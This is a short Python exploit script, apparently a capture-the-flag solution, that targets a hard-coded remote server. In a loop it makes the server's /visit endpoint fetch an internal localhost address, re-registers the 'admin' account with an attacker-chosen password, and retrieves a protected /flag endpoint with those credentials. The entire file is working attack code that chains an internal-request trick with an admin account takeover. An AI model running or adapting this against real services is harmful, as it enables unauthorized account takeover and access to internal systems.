import base64, time, requests
from datetime import datetime

TARGET = "http://34.72.72.63:23505"
ADMIN_NEW_PASS = "hitcat"
ROUNDS = 10
VISIT_DELAY_S = 0.6
SESSION = requests.Session()

def log(msg): print(f"{msg}", flush=True)
def b64_basic(u,p): return "Basic " + base64.b64encode(f"{u}:{p}".encode()).decode()

def do_visit():
    data_url = "http://127.0.0.1:8080/"
    r = SESSION.post(TARGET+"/visit", headers={"X-Target": data_url})
    log(f"/visit ->{r.text}")

def do_register():
    r = SESSION.post(TARGET+"/register", headers={"X-Username":"admin","X-Password":ADMIN_NEW_PASS})
    log(f"/register -> {r.text}")

def do_flag():
    r = SESSION.get(TARGET+"/flag", headers={"Authorization": b64_basic("admin", ADMIN_NEW_PASS)})
    log(f"/flag -> {r.text}")
    return r

for i in range(ROUNDS):
    log(f"== Round {i+1}/{ROUNDS} ==")
    do_visit()
    time.sleep(VISIT_DELAY_S)
    do_register()
    r = do_flag()
    if r.status_code == 200 and "flag" in r.text.lower():
        print("\n[FLAG]\n" + r.text + "\n")
        break
    time.sleep(0.7)
